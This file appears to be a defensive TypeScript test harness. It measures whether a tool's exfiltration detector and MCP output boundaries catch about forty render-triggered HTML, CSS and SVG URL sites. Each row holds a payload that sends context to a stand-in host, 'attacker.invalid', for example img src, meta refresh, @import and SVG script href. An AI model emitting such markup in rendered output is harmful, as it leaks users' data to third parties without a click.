// T46 — the render-triggered surface enumeration, MEASURED.
//
// One row per extraction site enumerated in T46-spec.md §2 from the HTML
// Standard's element index, the CSS <url> consumers and the SVG external-
// reference elements. For each row:
//
//   1. RENDERER ORACLE — Bun's HTMLRewriter (lol-html), a spec-derived tokenizer
//      with no relationship to this codebase, is asked whether a real parser
//      attributes the URL-bearing attribute to the element. For the CSS rows the
//      oracle reports the style text instead; the fetch claim there rests on the
//      CSS specification and is labelled `css-spec`.
//   2. DETECTOR — detectExfil(content, []) with an EMPTY allowlist: policy ids,
//      and whether the attacker host survives applyRedaction.
//   3. BOUNDARIES — dispatchCallTool (MCP), prepareOutputForPersistence,
//      validateOutputForTransport and redactToolOutput, all under
//      mergeMcpConfig({ redactToolOutput: false }) so what is measured is the
//      MANDATORY floor, not advisory redaction.
//
// Every host is reserved (`attacker.invalid`); nothing is contacted. Read-only.
//
// Usage: bun T46-surfaces.ts <out.json>
import { detectExfil } from "../../../../src/security/detect/exfil";
import { applyRedaction } from "../../../../src/security/redact";
import {
  prepareOutputForPersistence,
  validateOutputForTransport,
  type GuardResult,
} from "../../../../src/security/guard";
import { mergeMcpConfig } from "../../../../src/mcp/config";
import { buildDiscovery } from "../../../../src/mcp/discovery";
import { dispatchCallTool, type McpContext } from "../../../../src/mcp/dispatch";
import { redactToolOutput } from "../../../../src/mcp/redact-seam";

const ATT = "attacker.invalid";
const U = `https://${ATT}/p?ctx=CTX`;

type FetchClass = "SUB" | "NAV" | "DOC" | "NONE";

interface Row {
  id: string;
  site: string;
  group: "covered" | "html" | "css" | "svg" | "out-of-scope";
  fetchClass: FetchClass;
  content: string;
  // Renderer oracle: which element/attribute a real parser must attribute the
  // destination to. `null` => the claim rests on the CSS spec, not on a tokenizer.
  oracle: { selector: string; attr: string } | null;
  // A relative-destination twin of the same construct: covering the site must not
  // turn this into a finding.
  benign: string;
  note: string;
}

const rows: Row[] = [
  // ---------------------------------------------------------------- covered --
  {
    id: "C3.imgSrc",
    site: "<img src>",
    group: "covered",
    fetchClass: "SUB",
    content: `<img src="${U}">`,
    oracle: { selector: "img", attr: "src" },
    benign: `<img src="/assets/logo.png">`,
    note: "baseline: the already-covered site",
  },
  {
    id: "C4.imgSrcset",
    site: "<img srcset>",
    group: "covered",
    fetchClass: "SUB",
    content: `<img srcset="${U} 1x">`,
    oracle: { selector: "img", attr: "srcset" },
    benign: `<img srcset="/a.png 1x, /b.png 2x">`,
    note: "baseline",
  },
  {
    id: "C5.baseHref",
    site: "<base href>",
    group: "covered",
    fetchClass: "DOC",
    content: `<base href="https://${ATT}/x/"><img src="p.png">`,
    oracle: { selector: "base", attr: "href" },
    benign: `<base href="/docs/v2/">`,
    note: "baseline: the document-level site T52 added",
  },

  // ------------------------------------------------------------------- HTML --
  {
    id: "U01.inputImage",
    site: "<input type=image src>",
    group: "html",
    fetchClass: "SUB",
    content: `<input type="image" src="${U}" alt="go">`,
    oracle: { selector: "input", attr: "src" },
    benign: `<input type="image" src="/assets/go.png" alt="go">`,
    note: "an <img> twin; fetches on render, no click",
  },
  {
    id: "U01b.inputTextSrc",
    site: "<input type=text src> (control)",
    group: "html",
    fetchClass: "NONE",
    content: `<input type="text" src="${U}">`,
    oracle: { selector: "input", attr: "src" },
    benign: `<input type="text" name="q">`,
    note: "src on a non-image input fetches NOTHING — the type guard's control",
  },
  {
    id: "U01c.inputNoType",
    site: "<input src> with no type (control)",
    group: "html",
    fetchClass: "NONE",
    content: `<input src="${U}">`,
    oracle: { selector: "input", attr: "src" },
    benign: `<input name="q">`,
    note: "missing type defaults to text — no fetch",
  },
  {
    id: "U02.metaRefresh",
    site: "<meta http-equiv=refresh>",
    group: "html",
    fetchClass: "NAV",
    content: `<meta http-equiv="refresh" content="0;url=${U}">`,
    oracle: { selector: "meta", attr: "content" },
    benign: `<meta http-equiv="refresh" content="5">`,
    note: "the only NAV surface: the whole client goes to the attacker",
  },
  {
    id: "U02b.metaRefreshSpaced",
    site: "<meta http-equiv=refresh> spaced/upper",
    group: "html",
    fetchClass: "NAV",
    content: `<meta HTTP-EQUIV="Refresh" content="0; URL = ${U}">`,
    oracle: { selector: "meta", attr: "content" },
    benign: `<meta http-equiv="refresh" content="0; url=/next.html">`,
    note: "the content grammar tolerates spaces and case",
  },
  {
    id: "U02c.metaRefreshQuoted",
    site: "<meta http-equiv=refresh> quoted url",
    group: "html",
    fetchClass: "NAV",
    content: `<meta http-equiv="refresh" content="0;url='${U}'">`,
    oracle: { selector: "meta", attr: "content" },
    benign: `<meta http-equiv="refresh" content="0;url='/next.html'">`,
    note: "HTML permits the url value to be single- or double-quoted",
  },
  {
    id: "U02d.metaDescription",
    site: "<meta name=description> (control)",
    group: "html",
    fetchClass: "NONE",
    content: `<meta name="description" content="see ${U} for details">`,
    oracle: { selector: "meta", attr: "content" },
    benign: `<meta name="description" content="docs">`,
    note: "a URL inside a non-refresh meta fetches nothing",
  },
  {
    id: "U03.videoPoster",
    site: "<video poster>",
    group: "html",
    fetchClass: "SUB",
    content: `<video poster="${U}" controls></video>`,
    oracle: { selector: "video", attr: "poster" },
    benign: `<video poster="/assets/cover.png" controls></video>`,
    note: "fetched immediately, before any play",
  },
  {
    id: "U04.videoSrc",
    site: "<video src>",
    group: "html",
    fetchClass: "SUB",
    content: `<video src="${U}" controls></video>`,
    oracle: { selector: "video", attr: "src" },
    benign: `<video src="/assets/demo.mp4" controls></video>`,
    note: "fetched under the default preload=metadata",
  },
  {
    id: "U05.audioSrc",
    site: "<audio src>",
    group: "html",
    fetchClass: "SUB",
    content: `<audio src="${U}" controls></audio>`,
    oracle: { selector: "audio", attr: "src" },
    benign: `<audio src="/assets/clip.mp3" controls></audio>`,
    note: "as U04",
  },
  {
    id: "U06.sourceSrc",
    site: "<source src>",
    group: "html",
    fetchClass: "SUB",
    content: `<video controls><source src="${U}" type="video/mp4"></video>`,
    oracle: { selector: "source", attr: "src" },
    benign: `<video controls><source src="/assets/demo.mp4" type="video/mp4"></video>`,
    note: "MISSING from the previous enumeration (it listed only source srcset)",
  },
  {
    id: "U07.sourceSrcset",
    site: "<source srcset>",
    group: "html",
    fetchClass: "SUB",
    content: `<picture><source srcset="${U} 1x"><img src="/a.png"></picture>`,
    oracle: { selector: "source", attr: "srcset" },
    benign: `<picture><source srcset="/a.png 1x"><img src="/a.png"></picture>`,
    note: "inside <picture>",
  },
  {
    id: "U08.trackSrc",
    site: "<track src>",
    group: "html",
    fetchClass: "SUB",
    content: `<video controls><track default src="${U}" kind="captions"></video>`,
    oracle: { selector: "track", attr: "src" },
    benign: `<video controls><track default src="/captions.vtt" kind="captions"></video>`,
    note: "fetched when the track is enabled (default, or auto-enabled by language)",
  },
  {
    id: "U09.embedSrc",
    site: "<embed src>",
    group: "html",
    fetchClass: "SUB",
    content: `<embed src="${U}" type="image/svg+xml">`,
    oracle: { selector: "embed", attr: "src" },
    benign: `<embed src="/assets/diagram.svg" type="image/svg+xml">`,
    note: "",
  },
  {
    id: "U10.objectData",
    site: "<object data>",
    group: "html",
    fetchClass: "SUB",
    content: `<object data="${U}" type="image/svg+xml"></object>`,
    oracle: { selector: "object", attr: "data" },
    benign: `<object data="/assets/diagram.svg" type="image/svg+xml"></object>`,
    note: "",
  },
  {
    id: "U11.iframeSrc",
    site: "<iframe src>",
    group: "html",
    fetchClass: "SUB",
    content: `<iframe src="${U}"></iframe>`,
    oracle: { selector: "iframe", attr: "src" },
    benign: `<iframe src="/embed/demo.html"></iframe>`,
    note: "a whole nested document; load-bearing in benign documentation",
  },
  {
    id: "U12.iframeSrcdoc",
    site: "<iframe srcdoc>",
    group: "html",
    fetchClass: "SUB",
    content: `<iframe srcdoc="&lt;img src=&quot;${U}&quot;&gt;"></iframe>`,
    oracle: { selector: "iframe", attr: "srcdoc" },
    benign: `<iframe srcdoc="&lt;p&gt;hello&lt;/p&gt;"></iframe>`,
    note: "a nested INLINE document: every other surface again, one level down",
  },
  {
    id: "U13.scriptSrc",
    site: "<script src>",
    group: "html",
    fetchClass: "SUB",
    content: `<script src="${U}"></script>`,
    oracle: { selector: "script", attr: "src" },
    benign: `<script src="/assets/app.js"></script>`,
    note: "every quoted HTML file carries one",
  },
  {
    id: "U14.linkStylesheet",
    site: "<link rel=stylesheet href>",
    group: "html",
    fetchClass: "SUB",
    content: `<link rel="stylesheet" href="${U}">`,
    oracle: { selector: "link", attr: "href" },
    benign: `<link rel="stylesheet" href="/assets/site.css">`,
    note: "one site (link href), many rel values",
  },
  {
    id: "U14b.linkPreload",
    site: "<link rel=preload href>",
    group: "html",
    fetchClass: "SUB",
    content: `<link rel="preload" as="image" href="${U}">`,
    oracle: { selector: "link", attr: "href" },
    benign: `<link rel="preload" as="image" href="/assets/hero.png">`,
    note: "same site as U14 with a different rel — the previous enumeration counted it separately",
  },
  {
    id: "U14c.linkIcon",
    site: "<link rel=icon href>",
    group: "html",
    fetchClass: "SUB",
    content: `<link rel="icon" href="${U}">`,
    oracle: { selector: "link", attr: "href" },
    benign: `<link rel="icon" href="/favicon.ico">`,
    note: "same site as U14",
  },
  {
    id: "U15.linkImagesrcset",
    site: "<link imagesrcset>",
    group: "html",
    fetchClass: "SUB",
    content: `<link rel="preload" as="image" imagesrcset="${U} 1x">`,
    oracle: { selector: "link", attr: "imagesrcset" },
    benign: `<link rel="preload" as="image" imagesrcset="/hero.png 1x">`,
    note: "ABSENT from the previous enumeration",
  },
  {
    id: "U16.bodyBackground",
    site: "<body background>",
    group: "html",
    fetchClass: "SUB",
    content: `<body background="${U}">`,
    oracle: { selector: "body", attr: "background" },
    benign: `<body background="/assets/paper.png">`,
    note: "obsolete but honoured; the previous enumeration listed only td background",
  },
  {
    id: "U16b.tdBackground",
    site: "<td background>",
    group: "html",
    fetchClass: "SUB",
    content: `<table><tr><td background="${U}">x</td></tr></table>`,
    oracle: { selector: "td", attr: "background" },
    benign: `<table><tr><td background="/assets/cell.png">x</td></tr></table>`,
    note: "obsolete but honoured",
  },
  {
    id: "U17.frameSrc",
    site: "<frame src>",
    group: "html",
    fetchClass: "SUB",
    content: `<frameset><frame src="${U}"></frameset>`,
    oracle: { selector: "frame", attr: "src" },
    benign: `<frameset><frame src="/pages/nav.html"></frameset>`,
    note: "obsolete but honoured; ABSENT from the previous enumeration",
  },

  // -------------------------------------------------------------------- CSS --
  {
    id: "U18.styleAttrUrl",
    site: "CSS url() in a style= attribute",
    group: "css",
    fetchClass: "SUB",
    content: `<div style="background-image:url('${U}')">x</div>`,
    oracle: { selector: "div", attr: "style" },
    benign: `<div style="background-image:url('/assets/bg.png')">x</div>`,
    note: "css-spec claim; the oracle reports the attribute only",
  },
  {
    id: "U19.styleBlockUrl",
    site: "CSS url() in a <style> block",
    group: "css",
    fetchClass: "SUB",
    content: `<style>.a{background:url(${U})}</style>`,
    oracle: null,
    benign: `<style>.a{background:url(/assets/bg.png)}</style>`,
    note: "css-spec claim",
  },
  {
    id: "U20.cssImportUrl",
    site: "@import url(…)",
    group: "css",
    fetchClass: "SUB",
    content: `<style>@import url("${U}");</style>`,
    oracle: null,
    benign: `<style>@import url("/assets/site.css");</style>`,
    note: "css-spec claim",
  },
  {
    id: "U20b.cssImportBareString",
    site: '@import "…"',
    group: "css",
    fetchClass: "SUB",
    content: `<style>@import "${U}";</style>`,
    oracle: null,
    benign: `<style>@import "/assets/site.css";</style>`,
    note: "carries a URL with NO url() spelling — a url()-only matcher misses it. ABSENT from the previous enumeration",
  },
  {
    id: "U21.fontFaceSrc",
    site: "@font-face { src: url(…) }",
    group: "css",
    fetchClass: "SUB",
    content: `<style>@font-face{font-family:x;src:url("${U}")}</style>`,
    oracle: null,
    benign: `<style>@font-face{font-family:x;src:url("/assets/x.woff2")}</style>`,
    note: "css-spec claim",
  },
  {
    id: "U22.imageSet",
    site: "image-set()",
    group: "css",
    fetchClass: "SUB",
    content: `<div style="background-image:image-set('${U}' 1x)">x</div>`,
    oracle: { selector: "div", attr: "style" },
    benign: `<div style="background-image:image-set('/a.png' 1x)">x</div>`,
    note: "a URL-carrying value function. ABSENT from the previous enumeration",
  },
  {
    id: "U18b.cursorUrl",
    site: "CSS cursor: url()",
    group: "css",
    fetchClass: "SUB",
    content: `<div style="cursor:url('${U}'),auto">x</div>`,
    oracle: { selector: "div", attr: "style" },
    benign: `<div style="cursor:url('/a.cur'),auto">x</div>`,
    note: "one of the ten url()-consuming properties",
  },

  // -------------------------------------------------------------------- SVG --
  {
    id: "U23.svgImageHref",
    site: "SVG <image href>",
    group: "svg",
    fetchClass: "SUB",
    content: `<svg><image href="${U}" width="1" height="1"/></svg>`,
    oracle: { selector: "image", attr: "href" },
    benign: `<svg><image href="/assets/logo.png" width="1" height="1"/></svg>`,
    note: "the floor already matches the <image> TAG but reads only src/srcset",
  },
  {
    id: "U23b.svgImageXlink",
    site: "SVG <image xlink:href>",
    group: "svg",
    fetchClass: "SUB",
    content: `<svg><image xlink:href="${U}" width="1" height="1"/></svg>`,
    oracle: { selector: "image", attr: "xlink:href" },
    benign: `<svg><image xlink:href="/assets/logo.png" width="1" height="1"/></svg>`,
    note: "the legacy spelling, still honoured",
  },
  {
    id: "U24.svgFeImageHref",
    site: "SVG <feImage href>",
    group: "svg",
    fetchClass: "SUB",
    content: `<svg><filter id="f"><feImage href="${U}"/></filter></svg>`,
    oracle: { selector: "feimage", attr: "href" },
    benign: `<svg><filter id="f"><feImage href="/assets/a.png"/></filter></svg>`,
    note: "ABSENT from the previous enumeration",
  },
  {
    id: "U25.svgScriptHref",
    site: "SVG <script href>",
    group: "svg",
    fetchClass: "SUB",
    content: `<svg><script href="${U}"/></svg>`,
    oracle: { selector: "script", attr: "href" },
    benign: `<svg><script href="/assets/a.js"/></svg>`,
    note: "SVG spells script's src as href. ABSENT from the previous enumeration",
  },
  {
    id: "U26.svgUseHref",
    site: "SVG <use href> external",
    group: "svg",
    fetchClass: "NONE",
    content: `<svg><use href="${U}#icon"/></svg>`,
    oracle: { selector: "use", attr: "href" },
    benign: `<svg><use href="#icon"/></svg>`,
    note: "same-origin restricted in every engine — NOT a cross-origin fetch surface",
  },

  // ----------------------------------------------------------- out of scope --
  {
    id: "X01.anchorHref",
    site: "<a href> (click-gated)",
    group: "out-of-scope",
    fetchClass: "NONE",
    content: `<a href="${U}">go</a>`,
    oracle: { selector: "a", attr: "href" },
    benign: `<a href="/docs">go</a>`,
    note: "needs a click",
  },
  {
    id: "X02.formAction",
    site: "<form action> (submit-gated)",
    group: "out-of-scope",
    fetchClass: "NONE",
    content: `<form action="${U}"><input name="q"></form>`,
    oracle: { selector: "form", attr: "action" },
    benign: `<form action="/search"><input name="q"></form>`,
    note: "needs a submit",
  },
  {
    id: "X03.anchorPing",
    site: "<a ping> (click-gated)",
    group: "out-of-scope",
    fetchClass: "NONE",
    content: `<a href="/x" ping="${U}">go</a>`,
    oracle: { selector: "a", attr: "ping" },
    benign: `<a href="/x" ping="/beacon">go</a>`,
    note: "needs a click",
  },
  {
    id: "X04.templateImg",
    site: "<template> contents (inert)",
    group: "out-of-scope",
    fetchClass: "NONE",
    content: `<template><img src="${U}"></template>`,
    oracle: { selector: "template", attr: "id" },
    benign: `<template><img src="/a.png"></template>`,
    note: "template contents are inert in every conformant parser — a genuine negative",
  },
];

// ---------------------------------------------------------------- 1. oracle --
async function oracleValue(row: Row): Promise<string | null> {
  if (!row.oracle) return null;
  let seen: string | null = null;
  const { selector, attr } = row.oracle;
  const rewriter = new HTMLRewriter().on(selector, {
    element(element) {
      const value = element.getAttribute(attr);
      if (value !== null && seen === null) seen = value;
    },
  });
  await rewriter.transform(new Response(row.content)).text();
  return seen;
}

// -------------------------------------------------------------- 2. detector --
function detectorRow(row: Row): {
  matches: number;
  policyIds: string[];
  hostAfterRedaction: boolean;
  benignMatches: number;
} {
  const matches = detectExfil(row.content, []);
  return {
    matches: matches.length,
    policyIds: [...new Set(matches.map((match) => match.policyId))],
    hostAfterRedaction: applyRedaction(row.content, matches).includes(ATT),
    benignMatches: detectExfil(row.benign, []).length,
  };
}

// ------------------------------------------------------------ 3. boundaries --
const pass: GuardResult = {
  allowed: true,
  decision: { gate: "pass", action: "allow", findings: [] },
};

const cwd = process.cwd();

const ctx: McpContext = {
  cwd,
  config: mergeMcpConfig({ redactToolOutput: false }), // advisory OFF
  discovery: buildDiscovery({ modules: { mcp: { enabled: true } as never } }),
  transport: "in-process",
  tools: rows.map((row) => ({
    name: `s.${row.id}`,
    module: "standard" as const,
    description: row.id,
    inputSchema: { type: "object" },
    mutating: false,
    invoke: async () => ({ note: row.content }),
  })),
};

const out: Record<string, unknown> = {};
const releasedFetching: string[] = [];
const flaggedNonFetching: string[] = [];
const benignFlagged: string[] = [];

for (const row of rows) {
  const oracle = await oracleValue(row);
  const detector = detectorRow(row);

  const serialized = JSON.stringify({ note: row.content });
  const persist = prepareOutputForPersistence(pass, serialized);
  const transport = validateOutputForTransport({
    format: "json",
    value: { note: row.content },
  });
  const seam = await redactToolOutput(cwd, serialized);
  const mcp = await dispatchCallTool(ctx, `s.${row.id}`, {});

  const status =
    detector.matches === 0
      ? "released"
      : detector.hostAfterRedaction
        ? "partial"
        : "flagged";

  const reachesMcpUnmasked = JSON.stringify(mcp).includes(ATT);
  const reachesPersistenceUnmasked = persist.allowed
    ? persist.content.includes(ATT)
    : false;

  if (row.fetchClass !== "NONE" && status === "released") {
    releasedFetching.push(row.id);
  }
  if (row.fetchClass === "NONE" && status !== "released") {
    flaggedNonFetching.push(row.id);
  }
  if (detector.benignMatches > 0) benignFlagged.push(row.id);

  out[row.id] = {
    site: row.site,
    group: row.group,
    fetchClass: row.fetchClass,
    note: row.note,
    oracle: row.oracle
      ? {
          selector: row.oracle.selector,
          attr: row.oracle.attr,
          value: oracle,
          seesDestination: oracle !== null && oracle.includes(ATT),
        }
      : { kind: "css-spec", seesDestination: null },
    detector: { ...detector, status },
    boundaries: {
      mcpIsError: mcp.isError,
      mcpState: mcp.redaction?.state,
      mcpReasons: mcp.redaction?.reasons ?? [],
      reachesMcpUnmasked,
      persistenceAllowed: persist.allowed,
      reachesPersistenceUnmasked,
      persistenceBytesIdentical: persist.allowed
        ? persist.content === serialized
        : null,
      transportState: transport.redaction.state,
      reachesTransportUnmasked: transport.ok ? transport.text.includes(ATT) : false,
      reachesSeamUnmasked: seam.includes(ATT),
    },
  };

  console.log(
    `${row.id.padEnd(24)} ${row.fetchClass.padEnd(4)} detector=${status.padEnd(8)} ` +
      `policies=${JSON.stringify(detector.policyIds)} oracleSees=${
        row.oracle ? String(oracle !== null && oracle.includes(ATT)) : "css-spec"
      } mcp=${mcp.redaction?.state} unmaskedAt[mcp=${reachesMcpUnmasked} persist=${reachesPersistenceUnmasked} transport=${
        transport.ok ? transport.text.includes(ATT) : false
      } seam=${seam.includes(ATT)}] benignFlagged=${detector.benignMatches}`,
  );
}

const summary = {
  rows: rows.length,
  fetchingRows: rows.filter((row) => row.fetchClass !== "NONE").length,
  releasedFetchingCount: releasedFetching.length,
  releasedFetching,
  flaggedNonFetchingCount: flaggedNonFetching.length,
  flaggedNonFetching,
  benignControlsFlagged: benignFlagged,
};
console.log(JSON.stringify(summary, null, 2));

const file = process.argv[2];
if (file) await Bun.write(file, JSON.stringify({ summary, rows: out }, null, 2));
